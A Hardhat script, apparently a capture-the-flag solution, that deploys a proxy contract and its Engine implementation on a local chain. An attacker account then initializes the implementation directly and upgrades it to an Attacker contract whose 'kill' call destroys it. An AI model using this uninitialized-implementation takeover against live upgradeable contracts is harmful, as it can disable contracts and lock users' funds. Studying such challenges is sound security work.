// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  await hre.run('compile');
  const provider = new ethers.providers.JsonRpcProvider("http://127.0.0.1:8545/");
  const accounts = await hre.ethers.getSigners();

  // We get the contract to deploy
  const Engine = await ethers.getContractFactory("contracts/Motorbike.sol:Engine", accounts[0]);
  const engine = await Engine.deploy();

  await engine.deployed();

  const Motorbike = await ethers.getContractFactory("contracts/Motorbike.sol:Motorbike", accounts[0]);
  const motorbike = await Motorbike.deploy(engine.address);

  await motorbike.deployed();

  const Attacker = await ethers.getContractFactory("contracts/Motorbike.sol:Attacker", accounts[1]);
  const attacker = await Attacker.deploy();

  await attacker.deployed();

  let data = attacker.interface.encodeFunctionData("kill", []);
   
  const implBefore = await provider.getStorageAt(
    motorbike.address,    
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  );

  // step 1
  await engine.connect(accounts[1]).initialize();

  // step 2
  await engine.connect(accounts[1]).upgradeToAndCall(attacker.address, data);

  const engineCode = await provider.getCode(engine.address);
  console.log("engine code :::", engineCode.slice(0, 8));

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
